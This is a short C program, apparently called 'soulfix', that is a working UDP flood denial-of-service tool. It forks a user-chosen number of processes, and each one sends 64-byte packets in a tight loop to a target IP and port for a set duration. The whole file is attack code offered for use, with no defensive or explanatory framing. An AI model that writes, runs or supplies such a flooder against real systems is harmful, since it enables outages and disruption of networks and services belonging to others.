#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/wait.h>
#include <time.h>

void usage() {
    printf("Usage: ./soulfix ip port time processes\n");
    exit(1);
}

void attack(char *ip, int port, int duration) {
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime = time(NULL) + duration;

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        exit(1);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    server_addr.sin_addr.s_addr = inet_addr(ip);

    char payload[64];
    memset(payload, 'A', sizeof(payload));

    while (time(NULL) <= endtime) {
        sendto(sock, payload, sizeof(payload), 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
    }

    close(sock);
    exit(0);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int processes = atoi(argv[4]);

  //  printf("Flood started on %s:%d for %d seconds with %d processes\n", ip, port, duration, processes);

    for (int i = 0; i < processes; i++) {
        pid_t pid = fork();
        if (pid < 0) {
            perror("Fork failed");
            exit(1);
        }
        if (pid == 0) {
            attack(ip, port, duration);
        }
    }

    for (int i = 0; i < processes; i++) {
        wait(NULL);
    }

    printf("Attack finished\n");
    return 0;
}